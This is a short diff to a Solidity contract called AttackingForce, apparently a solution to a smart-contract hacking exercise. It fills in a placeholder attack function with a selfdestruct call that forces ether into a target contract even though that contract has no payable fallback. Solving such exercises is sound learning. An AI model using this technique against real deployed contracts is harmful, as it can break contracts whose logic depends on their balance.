@@ -10,6 +10,8 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        //Selfdestruc cannot be reverted even without fallback/receive functions declared in contractAddress.
+        selfdestruct(payable(contractAddress));
     }
+
 }
